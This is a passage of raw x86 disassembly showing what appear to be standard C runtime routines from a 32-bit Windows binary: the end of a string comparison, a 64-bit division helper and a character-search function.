  428b6c:	cmp    al,bl
  428b6e:	ja     0x428b72
  428b70:	add    al,dh
  428b72:	cmp    ah,al
  428b74:	jne    0x428b81
  428b76:	sub    ecx,0x1
  428b79:	jne    0x428b4c
  428b7b:	xor    ecx,ecx
  428b7d:	cmp    ah,al
  428b7f:	je     0x428b8a
  428b81:	mov    ecx,0xffffffff
  428b86:	jb     0x428b8a
  428b88:	neg    ecx
  428b8a:	mov    eax,ecx
  428b8c:	pop    ebx
  428b8d:	pop    esi
  428b8e:	pop    edi
  428b8f:	leave  
  428b90:	ret    
  428b91:	int3   
  428b92:	int3   
  428b93:	int3   
  428b94:	int3   
  428b95:	int3   
  428b96:	int3   
  428b97:	int3   
  428b98:	int3   
  428b99:	int3   
  428b9a:	int3   
  428b9b:	int3   
  428b9c:	int3   
  428b9d:	int3   
  428b9e:	int3   
  428b9f:	int3   
  428ba0:	push   esi
  428ba1:	mov    eax,DWORD PTR [esp+0x14]
  428ba5:	or     eax,eax
  428ba7:	jne    0x428bd1
  428ba9:	mov    ecx,DWORD PTR [esp+0x10]
  428bad:	mov    eax,DWORD PTR [esp+0xc]
  428bb1:	xor    edx,edx
  428bb3:	div    ecx
  428bb5:	mov    ebx,eax
  428bb7:	mov    eax,DWORD PTR [esp+0x8]
  428bbb:	div    ecx
  428bbd:	mov    esi,eax
  428bbf:	mov    eax,ebx
  428bc1:	mul    DWORD PTR [esp+0x10]
  428bc5:	mov    ecx,eax
  428bc7:	mov    eax,esi
  428bc9:	mul    DWORD PTR [esp+0x10]
  428bcd:	add    edx,ecx
  428bcf:	jmp    0x428c18
  428bd1:	mov    ecx,eax
  428bd3:	mov    ebx,DWORD PTR [esp+0x10]
  428bd7:	mov    edx,DWORD PTR [esp+0xc]
  428bdb:	mov    eax,DWORD PTR [esp+0x8]
  428bdf:	shr    ecx,1
  428be1:	rcr    ebx,1
  428be3:	shr    edx,1
  428be5:	rcr    eax,1
  428be7:	or     ecx,ecx
  428be9:	jne    0x428bdf
  428beb:	div    ebx
  428bed:	mov    esi,eax
  428bef:	mul    DWORD PTR [esp+0x14]
  428bf3:	mov    ecx,eax
  428bf5:	mov    eax,DWORD PTR [esp+0x10]
  428bf9:	mul    esi
  428bfb:	add    edx,ecx
  428bfd:	jb     0x428c0d
  428bff:	cmp    edx,DWORD PTR [esp+0xc]
  428c03:	ja     0x428c0d
  428c05:	jb     0x428c16
  428c07:	cmp    eax,DWORD PTR [esp+0x8]
  428c0b:	jbe    0x428c16
  428c0d:	dec    esi
  428c0e:	sub    eax,DWORD PTR [esp+0x10]
  428c12:	sbb    edx,DWORD PTR [esp+0x14]
  428c16:	xor    ebx,ebx
  428c18:	sub    eax,DWORD PTR [esp+0x8]
  428c1c:	sbb    edx,DWORD PTR [esp+0xc]
  428c20:	neg    edx
  428c22:	neg    eax
  428c24:	sbb    edx,0x0
  428c27:	mov    ecx,edx
  428c29:	mov    edx,ebx
  428c2b:	mov    ebx,ecx
  428c2d:	mov    ecx,eax
  428c2f:	mov    eax,esi
  428c31:	pop    esi
  428c32:	ret    0x10
  428c35:	int3   
  428c36:	int3   
  428c37:	int3   
  428c38:	int3   
  428c39:	int3   
  428c3a:	int3   
  428c3b:	int3   
  428c3c:	int3   
  428c3d:	int3   
  428c3e:	int3   
  428c3f:	int3   
  428c40:	lea    eax,[edx-0x1]
  428c43:	pop    ebx
  428c44:	ret    
  428c45:	lea    esp,[esp+0x0]
  428c4c:	lea    esp,[esp+0x0]
  428c50:	xor    eax,eax
  428c52:	mov    al,BYTE PTR [esp+0x8]
  428c56:	push   ebx
  428c57:	mov    ebx,eax
  428c59:	shl    eax,0x8
  428c5c:	mov    edx,DWORD PTR [esp+0x8]
  428c60:	test   edx,0x3
  428c66:	je     0x428c7d
  428c68:	mov    cl,BYTE PTR [edx]
  428c6a:	add    edx,0x1
  428c6d:	cmp    cl,bl
  428c6f:	je     0x428c40
  428c71:	test   cl,cl
  428c73:	je     0x428cc6
  428c75:	test   edx,0x3
  428c7b:	jne    0x428c68
  428c7d:	or     ebx,eax
  428c7f:	push   edi
  428c80:	mov    eax,ebx
  428c82:	shl    ebx,0x10
  428c85:	push   esi
  428c86:	or     ebx,eax
  428c88:	mov    ecx,DWORD PTR [edx]
  428c8a:	mov    edi,0x7efefeff
  428c8f:	mov    eax,ecx
  428c91:	mov    esi,edi
  428c93:	xor    ecx,ebx
  428c95:	add    esi,eax
  428c97:	add    edi,ecx
  428c99:	xor    ecx,0xffffffff
  428c9c:	xor    eax,0xffffffff
  428c9f:	xor    ecx,edi
  428ca1:	xor    eax,esi
  428ca3:	add    edx,0x4
  428ca6:	and    ecx,0x81010100
  428cac:	jne    0x428cca
  428cae:	and    eax,0x81010100
  428cb3:	je     0x428c88
  428cb5:	and    eax,0x1010100
  428cba:	jne    0x428cc4
  428cbc:	and    esi,0x80000000
  428cc2:	jne    0x428c88
  428cc4:	pop    esi
  428cc5:	pop    edi
  428cc6:	pop    ebx
  428cc7:	xor    eax,eax
  428cc9:	ret    
  428cca:	mov    eax,DWORD PTR [edx-0x4]
  428ccd:	cmp    al,bl
  428ccf:	je     0x428d07
  428cd1:	test   al,al
  428cd3:	je     0x428cc4
  428cd5:	cmp    ah,bl
  428cd7:	je     0x428d00
  428cd9:	test   ah,ah
  428cdb:	je     0x428cc4
  428cdd:	shr    eax,0x10
  428ce0:	cmp    al,bl
  428ce2:	je     0x428cf9
  428ce4:	test   al,al
  428ce6:	je     0x428cc4
  428ce8:	cmp    ah,bl
  428cea:	je     0x428cf2
  428cec:	test   ah,ah
  428cee:	je     0x428cc4
  428cf0:	jmp    0x428c88
  428cf2:	pop    esi
  428cf3:	pop    edi
  428cf4:	lea    eax,[edx-0x1]
  428cf7:	pop    ebx
  428cf8:	ret    
  428cf9:	lea    eax,[edx-0x2]
  428cfc:	pop    esi
  428cfd:	pop    edi
  428cfe:	pop    ebx
  428cff:	ret    
  428d00:	lea    eax,[edx-0x3]
  428d03:	pop    esi
  428d04:	pop    edi
  428d05:	pop    ebx
  428d06:	ret    
  428d07:	lea    eax,[edx-0x4]
  428d0a:	pop    esi
  428d0b:	pop    edi
  428d0c:	pop    ebx
  428d0d:	ret    
  428d0e:	jmp    DWORD PTR ds:0x429070
